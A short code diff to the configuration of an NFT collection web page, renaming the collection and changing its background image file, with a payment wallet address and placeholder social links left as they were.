@@ -10,7 +10,7 @@ const receiveAddress = "0xd4550697Fe601BdAeD1E591d47A887Aa7097400a";
 */
 
 const collectionInfo = {
-    name: "Moonwalkers NFTs",
+    name: "NFT Moon",
     date: "15.05.2022",
     socialMedia: {
         discord: "discord.gg/invite_here",
@@ -22,7 +22,7 @@ const collectionInfo = {
     },
     background: {
         type: "image", // Supported types: image, video, color (use image for gif)
-        image: "bd.png", // Image for image type or video preview for video type (image befor video load)
+        image: "bbb.png", // Image for image type or video preview for video type (image befor video load)
         video: "background.mp4", // If you don't use video type, you can ignore this line
         color: "#4E4E6D", // If you don't use color type, you can ignore this line
     }
